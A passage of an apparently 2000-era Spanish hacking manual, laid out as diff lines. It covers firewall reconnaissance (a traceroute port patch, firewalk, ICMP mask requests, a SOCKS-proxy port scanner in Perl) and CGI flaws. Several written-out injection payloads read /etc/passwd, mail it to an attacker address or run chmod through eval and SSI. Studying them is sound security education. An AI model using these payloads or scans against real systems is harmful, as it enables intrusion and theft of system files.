+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/param.h>
+#include <sys/time.h>
+#include <sys/errno.h>
+extern int h_errno;
+
+struct sockaddr_in *saddr = NULL;
+
+int
+check_udp_port(char *hostname, u_short port)
+{
+        int s, i, sr;
+        struct hostent *he;
+        fd_set rset;
+        struct timeval tv;
+        if(!saddr)
+        {
+                saddr = malloc(sizeof(struct sockaddr_in));
+                if(!saddr) return -1;
+
+                saddr->sin_family = AF_INET;
+                saddr->sin_addr.s_addr = inet_addr(hostname);
+                if(saddr->sin_addr.s_addr == INADDR_NONE)
+                {
+                        sethostent(1);
+                        he = gethostbyname(hostname);
+                        if(!he)
+                        {
+                                herror("gethostbyname");
+                                exit(1);
+                        }
+                        if(he->h_length <= sizeof(saddr->sin_addr.s_addr))
+                                bcopy(he->h_addr, &saddr->sin_addr.s_addr, he->
+h_length);
+                        else
+                                bcopy(he->h_addr, &saddr->sin_addr.s_addr, size
+of(saddr->sin_addr.s_addr));
+                        endhostent();
+                }
+        }
+        saddr->sin_port = htons(port);
+        s = socket(AF_INET, SOCK_DGRAM, 0);
+        if(s < 0)
+        {
+                perror("socket");
+                return -1;
+        }
+        i = connect(s, (struct sockaddr *)saddr, sizeof(struct sockaddr_in));
+        if(i < 0)
+        {
+                perror("connect");
+                return -1;
+        }
+        for(i=0;i < 3;i++)
+        {
+                write(s, "", 1);
+                FD_ZERO(&rset);
+                FD_SET(s, &rset);
+                tv.tv_sec = 5;
+                tv.tv_usec = 0;
+                sr = select(s+1, &rset, NULL, NULL, &tv);
+                if(sr != 1)
+                        continue;
+                if(read(s, &sr, sizeof(sr)) < 1)
+                {
+                        close(s);
+                        return 0;
+                }
+                else
+                {
+                        close(s);
+                        return 1;
+                }
+        }
+        close(s);
+        return 1;
+}
+<-->
+
+
+	Escaneo  basandose en  traceroute: este  metodo lo  usare para
+saber algo mas de los sistemas firewalleados. A continuacion detallare
+los  casos  especificos  que  nos  podemos  encontrar  en  el  uso  de
+traceroute para saber el camino  de nuestro ordenador al host remoto y
+del cual deduciremos el tipo de firewall que protege al host remoto.
+
+        1) Cuando el firewall bloquea  todo el trafico  excepto pings,
+ICMP de tipo 8, y respuestas de pings, ICMP de tipo 0. En este caso si
+hacemos un traceroute  normal (es decir usando UDP;  suponiendo que en
+la red de ejemplo estamos en  200.0.0.1 y para llegar a 200.0.0.10 hay
+que pasar por 200.0.0.2, 200.0.0.3... 200.0.0.10):
+
+	$ traceroute 200.0.0.10
+	traceroute to 200.0.0.10 (200.0.0.10), 30 hops max, 40 byte packets
+
+	...
+
+	9   * * *
+	10  * * *
+
+	En cambio si forzamos a traceroute a usar ICMPs observamos:
+
+	$ traceroute 200.0.0.10
+	traceroute to 200.0.0.10 (200.0.0.10), 30 hops max, 40 byte packets
+
+	...
+
+	9  200.0.0.9 ...
+	10 200.0.0.10 ...
+
+	Vemos, pues, que ya tenemos mas informacion de la que teniamos
+inicialmente.
+
+	2) Cuando  un  firewall bloquea  todo  el  trafico excepto  el
+puerto  UDP 53  (DNS),  observamos al  hacer un  traceroute normal:
+
+	$ traceroute 200.0.0.10
+	traceroute to 200.0.0.10 (200.0.0.10), 30 hops max, 40 byte packets
+
+	...
+
+	9  * * *
+	10 * * *
+
+	Por  tanto, se  puede  observar como  el  firewall nos  impide
+realizar esto, ya que solo admite queries de DNS.
+
+        A  continuacion  me  basare  en  lo siguiente;  que  se  puede
+determinar el  numero de hops  entre nosotros y el  host firewalleado,
+que se puede controlar el  puerto sobre el que lanzamos el traceroute,
+y que podemos cambiar el numero de pruebas enviadas de cada vez.
+
+	Basandose  en  esto,  podemos   controlar  el  puerto  que  se
+alcanzara  en el  firewall y  esto sera  de gran  ayuda sobre  todo si
+pensamos en que el firewall no  analiza el contenido de los paquetes y
+podemos hacerle pensar que son queries de DNS. Pero, la cosa no es tan
+facil  y  para  saber  con  que puerto  empezaremos  nuestro  escaneo,
+hacemos:
+
+	(puerto_host_remoto - (numero_de_hops * numero_de_pruebas)) - 1
+
+	y por tanto:
+
+	(53 - (8 * 3)) - 1 = 28
+
+	Y por tanto:
+
+	$ traceroute -p28 200.0.0.10
+	traceroute to 200.0.0.10 (200.0.0.10), 30 hops max, 40 byte packets
+
+	...
+
+	9  200.0.0.9 (200.0.0.9) x.x ms	* *
+	10 * * *
+
+	Puedes  observar  por  tanto,  que el  escaneo  termina  justo
+despues de pasar el puerto del firewall; esto es debido a que se sigue
+incrementando  el puerto  y por  tanto se  produce una  denegacion del
+firewall para ese  tipo de envio.  Pero, se puede  hacer un patch para
+traceroute para conseguir que no pase esto (gracias a firewalking, ver
+bibliografia):
+
+	/* pertenece a firewalking */
+
+---------------------8<-------- traceroute.diff ------------------------------
+--- traceroute.c.orig   Fri Aug 21 15:15:23 1998
++++ traceroute.c        Sun Aug 23 18:58:08 1998
+@@ -289,6 +289,7 @@
+ int nprobes = 3;
+ int max_ttl = 30;
+ int first_ttl = 1;
++int static_port = 0;
+ u_short ident;
+ u_short port = 32768 + 666;    /* start udp dest port # for probe packets */
+
+@@ -352,7 +353,7 @@
+                prog = argv[0];
+
+        opterr = 0;
+-       while ((op = getopt(argc, argv, "dFInrvxf:g:i:m:p:q:s:t:w:")) != EOF)
++       while ((op = getopt(argc, argv, "dFInrvxf:g:i:m:p:q:Ss:t:w:")) != EOF)
+                switch (op) {
+
+                case 'd':
+@@ -406,6 +407,13 @@
+                        options |= SO_DONTROUTE;
+                        break;
+
++               case 'S':
++                       /*
++                        * Tell traceroute to not increment the destination
++                        * port, useful for bypassing some packet filters.
++                        * Useless without the -p option.
++                       static_port = 1;
++                       break;
+                case 's':
+                        /*
+                         * set the ip source address of the outbound
+@@ -744,7 +752,7 @@
+                        register struct ip *ip;
+
+                        (void)gettimeofday(&t1, &tz);
+-                       send_probe(++seq, ttl, &t1);
++                       send_probe(static_port ? seq : ++seq, ttl, &t1);
+                        while ((cc = wait_for_reply(s, from, &t1)) != 0) {
+                                (void)gettimeofday(&t2, &tz);
+                                i = packet_ok(packet, cc, from, seq);
+@@ -1300,9 +1308,9 @@
+        extern char version[];
+
+        Fprintf(stderr, "Version %s\n", version);
+-       Fprintf(stderr, "Usage: %s [-dFInrvx] [-g gateway] [-i iface] \
+-[-f first_ttl] [-m max_ttl]\n\t[ -p port] [-q nqueries] [-s src_addr] [-t tos] \
+-[-w waittime]\n\thost [packetlen]\n",
++       Fprintf(stderr, "Usage: %s [-dFInrSvx] [-g gateway] [-i iface] \
++[-f first_ttl]\n\t[-m max_ttl] [ -p port] [-q nqueries] [-s src_addr] \
++[-t tos]\n\t[-w waittime] host [packetlen]\n",
+            prog);
+        exit(1);
+ }
+
+---------------------8<-------- traceroute.diff ------------------------------
+
+
+	Despues de aplicar este parche podremos hacer:
+
+	$ traceroute -S -p53 200.0.0.10
+	traceroute to 200.0.0.10 (200.0.0.10), 30 hops max, 40 byte packets
+
+	...
+
+	9  200.0.0.9 (200.0.0.9)  x.x ms  *  x.x ms
+	10 200.0.0.10 (200.0.0.10) x.x ms x.x ms x.x ms
+
+	Aplicando esta  tecnica; se  observa como podemos  obtener mas
+informacion del firewall que oculta  nuestro host a estudiar, como por
+ejemplo,  el  tipo de  trafico  que permite  pasar  el  firewall o  la
+configuracion de la red que se encuentra detras de el.
+
+	Mediante  la  herramienta  firewalk,  se  puede  obtener  esta
+informacion de  forma automatizada e incluso implementa  el escaneo de
+puertos, basandose en el envio  de paquetes TCP y UDP especificando un
+timeout;  si se recibe respuesta antes de hacerse efectivo el  timeout
+el puerto se considera abierto y  si no, se considera cerrado. Pero si
+quieres saber el funcionamiento a bajo nivel de este programa no dudes
+en  mirar  sus  fuentes  en  http://www.es2.net/research/firewalk.  Un
+ejemplo de su funcionamiento seria:
+
+	$ firewalk -n -P1-80 -pTCP 200.0.0.5 200.0.0.10
+	...
+	port	80: open
+	...
+
+
+	Conocimiento  de  la  mascarada  de  red  de  la  red  interna
+conectada   a  internet   mediante  gateway:   este   metodo  funciona
+correctamente cuando el host remoto  es win* pero no funciona en todos
+los linux.
+
+	Se basa en  el envio de un ICMP de tipo  17 (ICMP Address Mask
+Request) obteniendo en el caso de win* y algunos linux un ICMP de tipo
+18 (Address Mask Reply) con la direccion de la red interna.
+
+	Para implementar esta tecnica mostrare como hacer en sing:
+
+	$ sing -vv -mask 127.0.0.1
+	...
+
+
+	Un  ejemplo de  la implementacion  del envio  de este  tipo de
+ICMPs  se  encuentra en  un  programa  hecho  por David  G.   Andersen
+<angio@pobox.com> de  nombre icmpquery.c  (la version que  analice era
+1.0.3); y observamos:
+
+	...
+
+int initpacket(char *buf, int querytype, struct in_addr fromaddr)
+	{
+	struct ip *ip = (struct ip *)buf;
+	struct icmp *icmp = (struct icmp *)(ip + 1);
+
+	int icmplen = 0;
+
+	ip->ip_src = fromaddr;       /* si es 0, lo llena el kernel */
+	ip->ip_v = 4;                /* Implementado para ipv4  */
+	ip->ip_hl = sizeof *ip >> 2;
+	ip->ip_tos = 0;
+	ip->ip_id = htons(4321);
+	ip->ip_ttl = 255;
+	ip->ip_p = 1;
+	ip->ip_sum = 0;                 /* lo llena el kernel */
+
+	/*  se observa el  inicio de  la funcion  y definicion  de las
+caracteristicas ip necesarias */
+
+	...
+
+	icmp->icmp_seq = 1;
+	icmp->icmp_cksum = 0;
+	icmp->icmp_type = querytype;
+	icmp->icmp_code = 0;
+
+        switch(querytype) {
+        case ICMP_TSTAMP:
+           gettimeofday( (struct timeval *)(icmp+8), NULL);
+           bzero( icmp+12, 8);
+           icmplen = 20;
+           break;
+        case ICMP_MASKREQ:
+           *((char *)(icmp+8)) = 255;
+           icmplen = 12;
+           break;
+        default:
+           fprintf(stderr, "eek: unknown query type\n");
+           exit(0);
+   }
+   ip->ip_len = sizeof(struct ip) + icmplen;
+   return icmplen;
+}
+
+	/*  Es interesante  la definicion  del  tipo de  query que  es
+ciertamente en la que se basa  el switch y tambien debes fijarte en el
+caso ICMP_MASKREQ ya que la otra opcion es para hallar la hora remota,
+que no es nuestro proposito.  */
+
+       ...
+
+
+void sendpings(int s, int querytype, struct hostdesc *head, int delay,
+               struct in_addr fromaddr)
+
+     {
+        char buf[1500];
+        struct ip *ip = (struct ip *)buf;
+        struct icmp *icmp = (struct icmp *)(ip + 1);
+        struct sockaddr_in dst;
+        int icmplen;
+
+	/* inicio de funcion y definicion de variables */
+
+	...
+
+	bzero(buf, 1500);
+        icmplen = initpacket(buf, querytype, fromaddr);
+        dst.sin_family = AF_INET;
+
+	/*  se observa  aqui  el  uso de  la  primera funcion  copiada
+iniitpacket() */
+
+	...
+
+        while (head != NULL) {
+	#ifdef DEBUG
+                printf("pinging %s\n", head->hostname);
+	#endif
+                ip->ip_dst.s_addr = head->hostaddr.s_addr;
+                dst.sin_addr = head->hostaddr;
+                icmp->icmp_cksum = 0;
+                icmp->icmp_cksum = in_cksum((u_short *)icmp, icmplen);
+                if (sendto(s, buf, ip->ip_len, 0,
+                           (struct sockaddr *)&dst,
+                           sizeof(dst)) < 0) {
+                        perror("sendto");
+                }
+                if (delay)
+                        usleep(delay);
+                /* Don't flood the pipeline..kind of arbitrary */
+                head = head->next;
+        }
+}
+
+	/* se observa  la especificacion de DEBUG o  no, que simplente
+indica que  se saque por pantalla  que se esta pingeando  y despues se
+observa el  envio en si con sendto() */
+
+        ...
+
+
+void recvpings(int s, int querytype, struct hostdesc *head, int hostcount,
+               int broadcast)
+{
+        char buf[1500];
+        struct ip *ip = (struct ip *)buf;
+        struct icmp *icmp;
+        int err = 0;
+        long int fromlen = 0;
+        int hlen;
+        struct timeval tv;
+        struct tm *tmtime;
+        int recvd = 0;
+        char *hostto;
+        char hostbuf[128], timebuf[128];
+        struct hostdesc *foundhost;
+        unsigned long int icmptime, icmpmask;
+
+	/* inicio de la funcion y definicion de variables */
+
+        ...
+
+                switch(icmp->icmp_type) {
+                case ICMP_TSTAMPREPLY:
+                        icmptime = ntohl(icmp->icmp_ttime);
+                        tv.tv_sec -= tv.tv_sec%(24*60*60);
+                        tv.tv_sec += (icmptime/1000);
+                        tv.tv_usec = (icmptime%1000);
+                        tmtime = localtime(&tv.tv_sec);
+                        strftime(timebuf, 128, "%H:%M:%S", tmtime);
+                        printf("%-40.40s:  %s\n", hostto, timebuf);
+                        break;
+
+                case ICMP_MASKREPLY:
+                        icmpmask = ntohl(icmp->icmp_dun.id_mask);
+                        printf("%-40.40s:  0x%lX\n", hostto, icmpmask);
+                        break;
+
+                default:
+                        printf("Unknown ICMP message received (type %d)\n",
+                               icmp->icmp_type);
+                        break;
+                }
+                if (!broadcast)
+                        recvd++;
+        }
+}
+
+	/* el caso que nos  interesa es el ICMP_MASKREPLY y se observa
+como saca la informacion por pantalla */
+
+
+	Escaneo  a traves  de proxy:  una opcion  bastante interesante
+para que aunque  el escaneo de puertos en  realidad sea detectable por
+el host remoto  pero detecte la direccion del proxy  a traves del cual
+hacemos el  escaneo y no la nuestra.  Un ejemplo de codigo  en perl de
+aplicacion de esta tecnica lo tienes a continuacion:
+
+	/* extraido de Socks Scan V. 2.0 by ICEHOUSE <icehouse@salix.org> */
+
+	...
+
+	#!/usr/bin/perl
+	use strict;
+	use Net::SOCKS;
+
+	/* necesario, claro esta, para el correcto funcionamiento del
+	programa */
+
+	...
+
+	print "Socks Scan by ICEHOUSE\n" ;
+	print "OK we have ..\n";
+	print "Host To Scan --> @ARGV[0]\n";
+	print "End Port --> @ARGV[1]\n";
+	print "Socks Server --> @ARGV[2]\n";
+	print "Using Protocol --> @ARGV[3]\n";
+
+	/* saca en pantalla los argumentos pasados por el usuario */
+
+	...
+
+
+	my ($s);
+	for ($s; $s <= @ARGV[1]; $s++)
+	{
+	my $sock = new Net::SOCKS(socks_addr => @ARGV[2],
+ 		socks_port => 1080,
+                protocol_version => @ARGV[3]);
+	my $f= $sock->connect(peer_addr => @ARGV[0], peer_port => $s);
+
+	if ($sock->param('status_num') == SOCKS_OKAY) {
+	print "Port $s is OPEN\n";
+	$sock->close();
+	}
+		}
+
+	/*   Como  puedes   comprobar   esta  tecnica   es  de   facil
+implementacion en lenguaje perl, que en cierto modo, en gran numero de
+veces es mas sencillo para la programacion simple para redes */
+
+
+
+	III Relacion de principales servicios con puertos. Daemons.
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	Dado el gran numero de servicios que puede ofrecer una maquina
+(/etc/services). No  me parece del  todo logico agregar a  este manual
+hojas  y hojas  de documentacion  sobre  todos los  servicios, ya  que
+tampoco es el proposito de este manual el ense~ar el tipo de servicios
+que hay,  que se supone que  un usuario de linux  medio/avanzado ya lo
+sabe,  sino  mas  bien el  analisis  remoto  del  sistema en  si.   Te
+recomiendo  que leas TCP/IP  Illustrated vol.  1 y  2, Internetworking
+with TCP/IP  vol. 1 y 2  y TCP/IP Network  Administration; todos ellos
+los podras encontrar en www.amazon.com.
+
+	Solo quiero puntualizar que en base a los resultados obtenidos
+con  un buen  escaneador  de puertos  y  un programa  que averigue  el
+sistema operativo  es facil  analizar los citados  servicios obtenidos
+por cada puerto  y los daemons instalados. Por otra  parte, es mas que
+recomendable    estar   al    dia   en    packetstorm.securify.com   o
+securityfocus.com en lo  que se refiere a las  vulnerabilidades de los
+citados daemons, para asi poder parchearlas.
+
+	Aun asi, recomiendo la lectura  de papers o libros (como ya he
+dicho anteriormente) para tener una  vision clara de esto. En realidad
+este capitulo  del manual  no era  uno de mis  objetivos a  cumplir al
+escribirlo ya que creo que ya esta muy bien documentado.
+
+	Para  lo  que  si  que  voy  a dedicar  un  capitulo  dada  su
+importancia y  su generalizado uso en  el contexto actual  es para los
+CGIs.
+
+
+	CGIs
+	~~~~
+
+	Inicialmente, voy a explicar un  poco el problema en lo que se
+refiere a vulnerabilidades de  los scripts CGIs para despues presentar
+ejemplo de software  que puede ser utilizado para  encontrar este tipo
+de vulnerabilidades tan comunes y al mismo tiempo peligrosas.
+
+	CGI significa Common Gateway  Interface. Actualmente su uso en
+todo tipo de sistemas es normal  y el lenguaje de programacion que voy
+a adoptar para los mismos es PERL, por tanto asumo cierto conocimiento
+del  lenguaje  PERL por  el  lector  (si no  lo  tienes  ya sabes  :),
+Programming  Perl de  Larry  Wall,  Tom Christiansen  y  Jon Orwat  de
+Ed. O'Reilly es un buen  comienzo).  Aunque se pueden usar en sistemas
+win* yo tratare el caso de sistemas unix, por ser en los que tengo mas
+experiencia.
+
+	CGI  permite   la  comunicacion  entre   programas  cliente  y
+servidores que operan con http, siendo el protocolo en el que se lleva
+a cabo esta comunicacion TCP/IP  y el puerto el 80 (privilegiado) pero
+se especifican otros puertos no privilegiados.
+
+	Hay dos modos basicos en los que operan los scripts CGIs:
+
+	# Permitir  el proceso basico  de datos  que han  sido pasados
+mediante un input. Lease scripts  que por ejemplo chequean la correcta
+sintaxis de documentos HTML
+
+	# Actuar  como  conducto de  los  datos  que  son pasados  del
+programa   cliente   al  servidor   y   devueltos   del  servidor   al
+cliente. Lease script que por ejemplo actuan como frontend de una base
+de datos del servidor.
+
+	Los  scripts  CGI,  en  realidad,  ademas  de  PERL  (lenguaje
+interprete de programacion) se puede  usar TCL, shell script (de unix)
+y AppleScript  en lo  que se  refiere a este  tipo de  lenguajes, pero
+tambien  se  pueden  usar  lenguajes  de  programacion  compilables  y
+lenguajes  de  scripting.  Pero   usare  PERL  ya  que  los  lenguajes
+interpretados son mas faciles de  analizar y cambiar que los programas
+compilados por razones obvias.
+
+	Los tres metodos aplicable a programas CGI que voy a presentar
+son Post, Get y Put. para saber  lo que hace cada uno, puedes leer las
+especificaciones HTTP 1.0.
+
+	Las vulnerabilidades  de los scripts CGI  no estan propiamente
+en ellos mismos  sino en las especificaciones http  y los programas de
+sistema;   lo   unico  que   permite   CGI   es   acceder  a   citadas
+vulnerabilidades.
+
+	Mediante  ellos un  servidor  puede sufrir  lectura remota  de
+archivos,  adquisicion de  shell  de forma  ilegal  y modificacion  de
+ficheros del sistema asi que es  cierto que hay que analizar bien este
+tipo de  programas, ya que como  ves se pone en  peligro la integridad
+del sistema. Por lo tanto en un analisis remoto de un sistema es muy a
+tener en cuenta este tipo de vulnerabilidades.
+
+	El primer problema de dichos scripts en la falta de validacion
+suficiente   en   el  input   del   usuario,   que  conlleva   ciertos
+problemas. Los datos pasados mediante  un script CGI que use Get estan
+puestos al  final de una url y  estos son tratados por  el script como
+una variable de entorno llamada QUERY_STRING, con muestras de la forma
+variable=valor. Los llamados 'ampersands' separan dichas muestras (&),
+y junto con  los caracteres no alfanumericos deben  de ser codificados
+como  valores  hexadecimales  de   dos  digitos.  Todos  ellos,  viene
+precedidos por  el signo % en la  url codificada. Es el  script CGI el
+tiene que  borrar los caracteres que  han sido pasados  por el usuario
+mediante input, por ejemplo, si se quieren borrar los caracteres < o >
+y cosas asi de un documento html:
+
+	/* este ejemplo pertenece a Gregory Gillis */
+
+{$NAME, $VALUE) = split(/=/, $_);
+$VALUE =~ s/\+/ /g;               # reemplaza '+' con ' '
+$VALUE =~ s/%([0-9|A-F]{2})/pack(C,hex,{$1}}/eg; # reemplaza %xx con ASCII
+$VALUE =~ s/([;<>\*\|'&\$!#\(\)\[\]\{\}:"])/\\$1/g; #borra caracs especiales
+$MYDATA[$NAME} = $VALUE;
+
+        Pero, hay una cosa que no  hace este peque~o ejemplo, no se es
+consciente de la posibilidad de crear una nueva linea mediante %0a que
+se puede usar para ejecutar comandos diferentes de los del script. Por
+ejemplo, se podria hacer lo siguiente, de no caer en la cuenta de esta
+vulnerabilidad:
+
+http://www.ejemplo.com/cgi-bin/pregunta?%0a/bin/cat%20/etc/passwd
+
+	%20  es un espacio  en blanco  y %0a  como se  ha especificado
+anteriormente es una especie de return.
+
+	Digamos que el frontend que  hay en una pagina web para llamar
+a un script  CGI es un formulario. En todo  formulario tiene que haber
+un input,  este input tiene  un nombre asociado  que digamos es  lo ya
+expuesto anteriormente variable=valor.  Para una cierta seguridad, los
+contenidos del input deben de ser filtrados y por tanto los caracteres
+especiales deben  de ser filtrados a diferencia  del ejemplo comentado
+anteriormente.  Los  scripts  CGI   interpretados  que  fallan  en  la
+validacion  de  los  datos  pasan   los  dichos  datos  del  input  al
+interprete.
+
+	Otra etiqueta frecuente en los formularios es la select. Esta,
+permite al usuario elegir una  serie de opciones, y dicha seleccion va
+justo despues de variable=valor. Pasa  como con el input, de fallar la
+validacion   se  asume   que  dicha   etiqueta  solo   contiene  datos
+predefinidos  y los datos  son pasados  al interprete.   Los programas
+compilados  que  no  hacen  una validacion  semejante  son  igualmente
+vulnerables.
+
+	Otro de las vulnerabilidades muy frecuentes es el hecho de que
+si  el script llama  al programa  de correo  de unix,  y no  filtra la
+secuencia '~!' esta puede ser  usada para ejecutar un comando de forma
+remota ya que el programa de  correo permite ejecutar un comando de la
+forma '~!command', de nuevo, el problema de filtrado esta presente.
+
+	Por tora parte, si encuentras una llamada a exec() con un solo
+argumento esta puede  ser usada para obtener una  puerta de acceso. En
+el caso  de abrir un fichero por  ejemplo, se puede usar  un pipe para
+abrir una shell de la forma:
+
+	open(FICHERO, "| nombre_del_programa $ARGS");
+
+	Continuando  con  funciones  vulnerables,  si  encuentras  una
+llamada de  la forma  system() con un  solo argumento, esta  puede ser
+usada como  puerta de acceso  al sistema, ya  que el sistema  crea una
+shell para esto. Por ejemplo:
+
+	system("/usr/bin/sendmail -t %s < %s, $mail < $fichero");
+
+	/* supongo que te imaginaras:
+	   <INPUT TYPE="HIDDEN" NAME="mail"
+	   VALUE="mail@remotehost.com;mail mail@atacante.com; < /etc/passwd">
+	*/
+
+
+	Scripts  CGIs que  pasan inputs  del usuario  al  comando eval
+tambien se pueden aprovechar, puesto que:
+
+
+	$_ = $VALOR
+	s/"/\\"/g
+	$RESULTADO = eval qq/"$_"/;
+
+	Asi, si  por ejemplo $VALOR contiene  algun comando malicioso,
+el resultado para el servidor remoto puede ser bastante malo.
+
+	Es muy  recomendable revisar que  los permisos de  fichero son
+correctos y por  ejemplo de usar la libreria  cgi-lib, cosa muy normal
+esta  debe  de  tener   los  correspondientes  permisos  ya  que  sino
+estariamos ante otra vulnerabilidad.  Para chequear estos permisos, se
+haria de la forma generica: "%0a/bin/ls%20-la%20/usr/src/include".  Si
+se llegase a copiar, modificar  y reemplazar dicha libreria se podrian
+ejecutar  comandos o  rutinas de  forma  remota, con  lo que  conlleva
+eso. Ademas, si el interprete de  PERL utilizado por el cgi es SETUID,
+sera posible modificar permisos de los ficheros que quieras pasando un
+comando directamente  al sistema  a traves del  interprete, y  asi por
+ejemplo:
+
+$_ = "chmod 666 \/etc\/host.deny"
+$RESULT = eval qq/"$_"/;
+
+	Esto  es  gracias  a  SSI   y  la  mayoria  de  los  sysadmins
+competentes tendrian que desactivarlo. Para saber si un server utiliza
+esto se haria de la siguiente forma:
+
+	<!--#command variable="value" -->
+
+	<!--#exec cmd="chmod 666 /etc/host.deny"-->
+
+	Te recomiendo la  lectura de Perl CGI problems  by rfp (phrack
+55) para tener  una vision mas  completa del problema, ya  que analiza
+mas fallos de seguridad de CGIs.
+
+	Actualmente,  hay  escaneadores de  CGIs  en  los  que se  han
+descubierto vulnerabilidades, que en muchos  casos son de este tipo, o
+de otros mas  complejos que tampoco me parece  factible explicarlos en
+un  paper de este  tipo.  A  continuacion te  presento algunos  de los
+escaneadores de vulnerabilidades CGIs que me parecen mas completos (en
+este  apartado  simplemente nombrare  los  especificos  de  CGIs y  no
+aquellos  escaners  de tipo  vetescan  que  entre sus  funcionalidades
+a~adidas esta este tipo de escaneo):
+
+	- whisker by rain forest puppy
+	http://www.wiretrip.net/rfp/
+	- voideye by duke
+	http://packetstorm.securify.com/UNIX/cgi-scanners/voideye.zip
+	- ucgi by su1d sh3ll:
+        http://infected.ilm.net/unlg/
+	- Tss-cgi.sh
+	http://www.team-tss.org
+	- Cgichk
+	http://sourceforge.net/projects/cgichk/
+	- cgiscanner.pl (de raza mexicana)
+	http://packetstorm.securify.com/UNIX/scanners/cgiscanner.pl
+
+	Destacar, que para mi, el mejor de los citados es el whisker de rfp :)
+	Y bueno, se acabo.
+
+
+	3. Bibliografia y agradecimientos
+	   ==============================
+
+	Bibliografia:
+	~~~~~~~~~~~~~
+	[1] TCP/IP Illustrated vol. 1 by Richard Stevens
+	[2] Remote OS detection via TCP/IP Stack FingerPrinting by Fyodor
+	[3] BIND 8.2 - 8.2.2 *Remote root Exploit How-To* by E-Mind
+	[4] The Art of Port Scanning by Fyodor
+	[5] Port Scanning without the SYN flag by Uriel Maimon
+	[6] Port Scanning; A Basic Understanding by John Holstein
+	[7] Intrusion Detection Level Analysis of Nmap and Queso by Toby Miller
+	[8] Scanning for RPC Services by halflife
+	[9] Firewalking, A Traceroute-Like Analysis of IP Packet Responses
+	to  Determine  Gateway   Access  Control  Lists  by  Cambridge
+	Technology Partners'
+	[10] Techniques To Validate Host-Connectivity by dethy@synnergy.net
+	[11] CGI Security Holes by Gregory Gillis
+	[12] Passive Mapping, The Importance of Stimuli by Coretez Giovanni
+	[13] Examining port scan methods - Analysing Audible Techniques
+	by dethy@synnergy.net
+	[14] A network intrusion detection system test suite
+	by Anzen Computing
+	[15] Passive Mapping: An Offensive Use of IDS by Coretez Giovanni
+	[16] SWITCH - Swiss Academic & Research Network. Default TTL Values in
+	TCP/IP
+
+	Programas recomendables para hacer mejor uso de este paper:
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	queso		tcpdump		snort		ipsend
+	siphon		conda		iplog		sos
+	sing		icmpquery	iputils		isic
+	hping2		ss		arping		nemesis
+	ethereal	checkos		dps		sendip
+	nmap		nessus		dscan		spak
+	nsat		satan		icmpenum	fragrouter
+
+	etc...
+
+	Gracias a los canales:
+	~~~~~~~~~~~~~~~~~~~~~~
+	#networking, #hack, #hackers y #linux @ irc-hispano.org.
+	#hax, #phrack, #spain y #localhost @ efnet.
+
+	Gracias por su ayuda a:
+	~~~~~~~~~~~~~~~~~~~~~~~
+	bit-quake, impresionante :)
+	icehouse
+	nunotreez
+	crg
+	lyw0d
+	merphe
+
+	Un saludo para:
+	~~~~~~~~~~~~~~~
+
+	icehouse,   nunotreez,  iceman,  merphe,   madj0ker,  zhodiac,
+yomismo,  pib/kempo, codex, yandros,  darkcode, show,  mixter, fyodor,
+juliano rizzo,  billsucks, jcea, yaw, karlosfx,  iphdrunk, satch, pci,
+doing, lyw0d, graffic,  padre, surfing, savage, ulandron, bladi,  dab,
+n0mada, norwegian, kahuna, yuanca, ripe, ucalu, xphase3x, slayer, jfs,
+stk,  zer0-enna, pip0,  ppp0, no-ana,  sirlance, brainbug,  zc|||, f`,
+pip, bonjy,  ca|n/wildcore, koge, voodoo,  anony, kerberos, thewizard,
+inetd,  yeyun0,   cp,  nemona,  tdp,   rvr,  ln_/l0gin,  odd,  bijoux,
+route/daemon9, logistix,  ampire, gov-boi... y  tambien todos aquellos
+que me he olvidado.
+
+	 Y gracias a ti por haber leido este documento.
+
+	 Sun Dec 31 17:11:59 CET 2000
+
+	 Ultima revision: Wed Jan 17 23:56:53 CET 2001
+
+		 -honoriak
+
+	 "callar es asentir, no te dejes llevar"
+
+
+ *EOF*
+
